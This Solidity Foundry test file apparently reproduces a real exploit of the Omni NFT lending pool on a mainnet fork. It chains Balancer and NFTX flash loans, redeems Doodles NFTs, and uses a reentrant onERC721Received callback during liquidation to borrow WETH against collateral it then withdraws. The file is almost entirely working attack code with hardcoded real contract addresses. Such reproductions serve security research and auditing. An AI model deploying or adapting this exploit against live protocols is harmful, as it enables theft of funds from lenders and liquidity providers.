// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Credit: SupremacyCA, the poc rewritten from SupremacyCA.

contract ContractTest is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 private nonce;
    address private immutable owner;
    address private _lib;
    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    modifier onlyOwner() {
        require(msg.sender == owner, "Not your biz!");
        _;
    }

    constructor() {
        cheats.createSelectFork("mainnet", 15_114_361); // fork mainnet at block 15114361
        owner = msg.sender; // Hacker
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        emit log_named_uint("Before exploiting, ETH balance of attacker:", address(this).balance);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "You are not a market maker for Flash Loan!");
        doodle.approve(address(doodle), type(uint256).max);
        doodles.setApprovalForAll(address(doodle), true);
        doodleVault.flashLoan(address(this), address(doodle), 20 ether, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        require(msg.sender == address(doodle), "You are not a market maker for Flash Loan!");

        WETH.approve(address(router), type(uint256).max);

        address[] memory _path = new address[](2);
        _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE

        router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);

        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;

        doodleVault.redeem(20, _specificIds);

        require(doodles.balanceOf(address(this)) >= 20, "redeem error.");

        Lib lib = new Lib();

        _lib = address(lib);

        lib.approve();

        uint256 length = _specificIds.length;

        for (uint256 i = 0; i < length; i++) {
            doodles.transferFrom(address(this), address(_lib), _specificIds[i]);
        }

        lib.joker();

        uint256[] memory _amount = new uint256[](20);

        for (uint256 j = 0; j < _amount.length; j++) {
            _amount[j] = 0;
        }

        require(ILib(_lib).withdrawAll(), "Withdraw Error.");

        require(doodleVault.mint(_specificIds, _amount) == 20, "Error Amounts.");

        uint256 profit = getters();
        emit log_named_uint("After exploiting, ETH balance of attacker:", address(this).balance);

        return RETURN_VALUE;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (msg.sender == NToken) {
            if (nonce == 21) {
                nonce++;
                WETH.approve(address(pool), type(uint256).max);
                pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);
                return this.onERC721Received.selector;
            } else if (nonce == 22) {
                uint256[] memory _specificIds = new uint256[](3);
                _specificIds[0] = 720;
                _specificIds[1] = 5251;
                _specificIds[2] = 7425;

                uint256 length = _specificIds.length;
                for (uint256 i = 0; i < length; i++) {
                    doodles.safeTransferFrom(address(this), address(_lib), _specificIds[i]);
                }

                nonce = 1337;

                require(ILib(_lib).attack(), "Attack Error!");

                return this.onERC721Received.selector;
            } else {
                nonce++;
                return this.onERC721Received.selector;
            }
        } else {
            return this.onERC721Received.selector;
        }
    }

    function getters() internal returns (uint256) {
        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;

        uint256[] memory _amounts = new uint256[](20);
        _amounts[0] = 0;
        _amounts[1] = 0;
        _amounts[2] = 0;
        _amounts[3] = 0;
        _amounts[4] = 0;
        _amounts[5] = 0;
        _amounts[6] = 0;
        _amounts[7] = 0;
        _amounts[8] = 0;
        _amounts[9] = 0;
        _amounts[10] = 0;
        _amounts[11] = 0;
        _amounts[12] = 0;
        _amounts[13] = 0;
        _amounts[14] = 0;
        _amounts[15] = 0;
        _amounts[16] = 0;
        _amounts[17] = 0;
        _amounts[18] = 0;
        _amounts[19] = 0;

        WETH.transfer(address(balancer), 1000 ether);

        uint256 balance = WETH.balanceOf(address(this));

        WETH.withdraw(balance);

        return address(this).balance;
    }

    receive() external payable {}
}

contract Lib {
    address private immutable exp;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;

    modifier onlyExp() {
        require(msg.sender == exp, "Not your biz!");
        _;
    }

    constructor() {
        exp = msg.sender;
    }

    function approve() external onlyExp {
        doodles.setApprovalForAll(address(pool), true);
        WETH.approve(address(pool), type(uint256).max);
    }

    function joker() external onlyExp {
        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](3);

        _params[0].tokenId = 720;
        _params[0].useAsCollateral = true;

        _params[1].tokenId = 5251;
        _params[1].useAsCollateral = true;

        _params[2].tokenId = 7425;
        _params[2].useAsCollateral = true;

        pool.supplyERC721(address(doodles), _params, address(this), 0);

        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));

        pool.borrow(address(WETH), amount, 2, 0, address(this));

        uint256[] memory tokenIds = new uint256[](2);

        tokenIds[0] = 720;
        tokenIds[1] = 5251;

        require(pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2, "Withdraw Error.");
    }

    function attack() external onlyExp returns (bool) {
        doodles.setApprovalForAll(address(pool), true);

        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](20);

        _params[0].tokenId = 4777;
        _params[0].useAsCollateral = true;

        _params[1].tokenId = 4784;
        _params[1].useAsCollateral = true;

        _params[2].tokenId = 2956;
        _params[2].useAsCollateral = true;

        _params[3].tokenId = 7806;
        _params[3].useAsCollateral = true;

        _params[4].tokenId = 4314;
        _params[4].useAsCollateral = true;

        _params[5].tokenId = 7894;
        _params[5].useAsCollateral = true;

        _params[6].tokenId = 9582;
        _params[6].useAsCollateral = true;

        _params[7].tokenId = 1603;
        _params[7].useAsCollateral = true;

        _params[8].tokenId = 4510;
        _params[8].useAsCollateral = true;

        _params[9].tokenId = 6932;
        _params[9].useAsCollateral = true;

        _params[10].tokenId = 1253;
        _params[10].useAsCollateral = true;

        _params[11].tokenId = 6760;
        _params[11].useAsCollateral = true;

        _params[12].tokenId = 9403;
        _params[12].useAsCollateral = true;

        _params[13].tokenId = 1067;
        _params[13].useAsCollateral = true;

        _params[14].tokenId = 179;
        _params[14].useAsCollateral = true;

        _params[15].tokenId = 4017;
        _params[15].useAsCollateral = true;

        _params[16].tokenId = 7165;
        _params[16].useAsCollateral = true;

        _params[17].tokenId = 720;
        _params[17].useAsCollateral = true;

        _params[18].tokenId = 5251;
        _params[18].useAsCollateral = true;

        _params[19].tokenId = 7425;
        _params[19].useAsCollateral = true;

        pool.supplyERC721(address(doodles), _params, address(this), 0);

        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));

        pool.borrow(address(WETH), amount, 2, 0, address(this));

        return true;
    }

    function withdrawAll() external onlyExp returns (bool) {
        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;

        pool.withdrawERC721(address(doodles), _specificIds, address(exp));

        uint256 balance = WETH.balanceOf(address(this));

        WETH.transfer(address(exp), balance);

        return true;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
